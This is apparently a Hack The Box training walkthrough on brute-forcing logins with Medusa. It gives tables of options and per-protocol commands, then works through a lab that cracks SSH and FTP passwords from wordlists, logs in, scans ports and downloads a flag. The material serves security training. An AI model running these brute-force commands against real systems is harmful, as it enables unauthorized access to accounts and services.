
# Untitled

|Parameter|Explanation|Usage Example|
|---|---|---|
|`-h HOST` or `-H FILE`|Target options: Specifies a single target hostname or IP address (`-h`) or a file containing a list of targets (`-H`).|`medusa -h 192.168.1.10 ...` or `medusa -H targets.txt ...`|
|`-u USERNAME` or `-U FILE`|Username options: Provides a single username (`-u`) or a file containing a list of usernames (`-U`).|`medusa -u admin ...` or `medusa -U usernames.txt ...`|
|`-p PASSWORD` or `-P FILE`|Password options: Specifies a single password (`-p`) or a file containing a list of passwords (`-P`).|`medusa -p password123 ...` or `medusa -P passwords.txt ...`|
|`-M MODULE`|Module: Defines the specific module to use for the attack (e.g., `ssh`, `ftp`, `http`).|`medusa -M ssh ...`|
|`-m "MODULE_OPTION"`|Module options: Provides additional parameters required by the selected module, enclosed in quotes.|`medusa -M http -m "POST /login.php HTTP/1.1\r\nContent-Length: 30\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=^USER^&password=^PASS^" ...`|
|`-t TASKS`|Tasks: Defines the number of parallel login attempts to execute, potentially speeding up the attack.|`medusa -t 4 ...`|
|`-f` or `-F`|Fast mode: Stops the attack after finding the first successful login, either on the current host (`-f`) or any host (`-F`).|`medusa -f ...` or `medusa -F ...`|
|`-n PORT`|Port: Specifies a non-default port for the target service.|`medusa -n 2222 ...`|
|`-v LEVEL`|Verbose output: Displays detailed information about the attack progress. The higher the `LEVEL` (up to 6), the more detailed the output.|`medusa -v 4 ...`|

### Medusa Modules

Each module in Medusa is designed to interact with specific authentication mechanisms, allowing it to send the appropriate requests and interpret responses for successful attacks. Below is a table of commonly used modules:

|Medusa Module|Service/Protocol|Description|Usage Example|
|---|---|---|---|
|FTP|File Transfer Protocol|Brute-forces FTP login credentials, used for file transfers on a network.|`medusa -M ftp -h 192.168.1.100 -u admin -P passwords.txt`|
|HTTP|Hypertext Transfer Protocol|Brute-forces web application login forms over HTTP (GET/POST).|`medusa -M http -h www.example.com -U users.txt -P passwords.txt -m DIR:/login.php -m FORM:username=^USER^&password=^PASS^`|
|IMAP|Internet Message Access Protocol|Brute-forces IMAP logins, often used to access email servers.|`medusa -M imap -h mail.example.com -U users.txt -P passwords.txt`|
|MySQL|MySQL Database|Brute-forces MySQL database credentials, commonly used for web applications and databases.|`medusa -M mysql -h 192.168.1.100 -u root -P passwords.txt`|
|POP3|Post Office Protocol 3|Brute-forces POP3 logins, typically used to retrieve emails from a mail server.|`medusa -M pop3 -h mail.example.com -U users.txt -P passwords.txt`|
|RDP|Remote Desktop Protocol|Brute-forces RDP logins, commonly used for remote desktop access on Windows systems.|`medusa -M rdp -h 192.168.1.100 -u admin -P passwords.txt`|
|SSHv2|Secure Shell (SSH)|Brute-forces SSH logins, commonly used for secure remote access.|`medusa -M ssh -h 192.168.1.100 -u root -P passwords.txt`|
|Subversion (SVN)|Version Control System|Brute-forces Subversion (SVN) repositories for version control.|`medusa -M svn -h 192.168.1.100 -u admin -P passwords.txt`|
|Telnet|Telnet Protocol|Brute-forces Telnet services for remote command execution on older systems.|`medusa -M telnet -h 192.168.1.100 -u admin -P passwords.txt`|
|VNC|Virtual Network Computing|Brute-forces VNC login credentials for remote desktop access.|`medusa -M vnc -h 192.168.1.100 -P passwords.txt`|
|Web Form|Web login form brute force|Brute-forces web login forms using HTTP POST requests.|`medusa -M web-form -h www.example.com -U users.txt -P passwords.txt -m FORM:"username=^USER^&password=^PASS^:F=Invalid"`|

## Getting Started

**To follow the steps, start the target system via the questions section at the bottom of the page.**

We begin our exploration by targeting an SSH server running on a remote system. Assuming we know the username `sshuser` in advance, we can leverage Medusa to systematically test different password combinations until successful authentication is achieved.

The following command serves as our starting point:

`snchh337@htb$ medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3`

Let’s break down each component:

- `-h <IP>`: Specifies the IP address of the target system.
- `-n <PORT>`: Defines the port on which the SSH service is listening (typically port 22).
- `-u sshuser`: Sets the username for the brute-force attack.
- `-P 2023-200_most_used_passwords.txt`: Points Medusa to a wordlist containing the 200 most used passwords in 2023. The effectiveness of a brute-force attack is often tied to the quality and relevance of the wordlist used.
- `-M ssh`: Selects the SSH module within Medusa, tailoring the attack specifically for SSH authentication.
- `-t 3`: Indicates the number of parallel login attempts to execute simultaneously. Increasing this number can speed up the attack but may also increase the likelihood of detection or triggering security measures on the target system.


```
snchh337@htb$ medusa -h IP -n PORT -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3

Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
...
ACCOUNT FOUND: [ssh] Host: IP User: sshuser Password: 1q2w3e4r5t [SUCCESS]
```

After execution, Medusa will show its progress as it goes through the password combinations. The output will indicate a successful login, revealing the correct password.

## Gaining Access

With the password in hand, establish an SSH connection using the following command and enter the found password when prompted:

`snchh337@htb$ ssh sshuser@<IP> -p PORT`

This command will initiate an interactive SSH session, granting you access to the remote system's command line.

### Expanding the Attack Surface

Once inside the system, the next step is to identify other potential attack surfaces. Using `netstat` (within the SSH session) to list open ports and listening services, you discover a service running on port 21.

```
snchh337@htb$ netstat -tulpn | grep LISTEN

tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 :::21                   :::*                    LISTEN      -

```

Additional reconnaissance with `nmap` (within the SSH session) confirms this finding is an FTP server.

```
snchh337@htb$ nmap localhost

Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-05 13:19 UTC
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000078s latency).
Other addresses for localhost (not scanned): ::1
Not shown: 998 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 0.05 seconds
```
### Targeting the FTP Server

Having identified the FTP server, you can proceed to brute force its authentication mechanism.

If we explore the `/home` directory on the target system, we see a folder named `ftpuser`, which implies the likelihood that the FTP server's username is `ftpuser`. Based on this, we can modify our Medusa command accordingly:

```
snchh337@htb$ medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5

Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

GENERAL: Parallel Hosts: 1 Parallel Logins: 5
GENERAL: Total Hosts: 1
GENERAL: Total Users: 1
GENERAL: Total Passwords: 197
...
ACCOUNT FOUND: [ftp] Host: 127.0.0.1 User: ... Password: ... [SUCCESS]
...
GENERAL: Medusa has finished.
```
The key differences here are:

- `-h 127.0.0.1`: Targets the local system since the FTP server is running locally. Using the IP address explicitly tells Medusa to use IPv4.
- `-u ftpuser`: Specifies the username `ftpuser`.
- `-M ftp`: Selects the FTP module within Medusa.
- `-t 5`: Increases the number of parallel login attempts to 5.

### Obtaining the Flag

After successfully cracking the FTP password, establish an FTP connection. Within the FTP session, use the `get` command to download the `flag.txt` file, which may contain sensitive information:

```
snchh337@htb$ ftp ftp://ftpuser:<FTPUSER_PASSWORD>@localhost

Trying [::1]:21 ...
Connected to localhost.
220 (vsFTPd 3.0.5)
331 Please specify the password.
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
200 Switching to Binary mode.
ftp> ls
229 Entering Extended Passive Mode (|||25926|)
150 Here comes the directory listing.
-rw-------    1 1001     1001           35 Sep 05 13:17 flag.txt
226 Directory send OK.
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||37251|)
150 Opening BINARY mode data connection for flag.txt (35 bytes).
100% |***************************************************************************|    35      776.81 KiB/s    00:00 ETA
226 Transfer complete.
35 bytes received in 00:00 (131.45 KiB/s)
ftp> exit
221 Goodbye.
```

